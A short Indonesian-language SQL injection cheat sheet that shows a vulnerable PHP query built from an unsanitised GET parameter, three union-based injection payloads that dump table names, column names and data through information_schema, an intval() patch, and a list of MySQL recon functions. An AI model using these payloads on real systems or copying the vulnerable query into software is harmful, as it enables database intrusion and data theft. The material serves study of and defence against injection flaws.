<?php

VULN
$id = $_GET["id"];
$q = mysqli_query($conn, "SELECT * FROM user WHERE id=$id");

EXPLOIT
url = asd.com/edit.php?id=

1. Melihat table pada database
-99999 UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema = database()--+
2. Melihat kolom pada table
-99999 UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_schema = database() AND table_name = 'nama_tablenya'--+
3. Melihat isi pada kolom
-99999 UNION SELECT 1,group_concat(nama_kolom),3,4 FROM nama_database.nama_table--+

PATCH
$id = intval($_GET["id"]);
$q = mysqli_query($conn, "SELECT * FROM user WHERE id=$id");

intval() agar inputnya menjadi integer

Variable/Function		Output
@@hostname	:	Current Hostname
@@tmpdir	:	Tept Directory
@@datadir	:	Data Directory
@@version	:	Version of DB
@@basedir	:	Base Directory
user()		:	Current User
database()	:	Current Database
version()	:	Version
schema()	:	current Database
UUID()		:	System UUID key
current_user()	:	Current User
current_user	:	Current User
system_user()	:	Current Sustem user
session_user()	:	Session user
@@GLOBAL.have_symlink	:	Check if Symlink Enabled or Disabled
@@GLOBAL.have_ssl		:	Check if it have ssl or not